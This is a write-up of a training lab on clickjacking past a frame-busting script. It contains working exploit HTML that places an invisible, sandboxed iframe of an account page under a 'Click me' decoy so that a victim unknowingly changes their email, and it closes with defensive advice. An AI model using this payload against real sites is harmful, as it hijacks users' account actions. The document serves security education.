# Lab: Clickjacking with a Frame Buster Script

## Description

This lab demonstrates a clickjacking vulnerability in which the target application is protected by a frame-busting script. The objective is to bypass the frame buster and trick a victim into changing their email address by clicking on a visible **"Click me"** element.

## Exploitation

After logging into the application using the provided credentials, I observed that the website employed a frame-busting script to prevent framing. To neutralize this protection, I embedded the account page within an iframe using the HTML5 `sandbox` attribute. By specifying the `allow-forms` value and omitting `allow-top-navigation`, the frame-buster script was prevented from escaping the iframe.

I then created a decoy page containing a visible **"Click me"** element and positioned it over the hidden **Update email** button. After aligning the iframe and reducing its opacity, the exploit was delivered to the victim. When the victim clicked the visible text, the click was redirected to the hidden button, causing the email address to be updated successfully.

### Exploit HTML

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 300px;
        left: 60px;
        z-index: 1;
    }
</style>

<div>Click me</div>

<iframe
    src="https://0a94004f046a55fc8087038e009d0066.web-security-academy.net/my-account?email=hacker@example.com"
    sandbox="allow-forms">
</iframe>
```



This lab demonstrates that frame-busting scripts alone are not sufficient to prevent clickjacking attacks. By leveraging the HTML5 `sandbox` attribute, an attacker can neutralize the frame-buster and successfully perform unauthorized actions. Effective protection requires the use of mechanisms such as **X-Frame-Options** or **Content Security Policy (CSP)**.
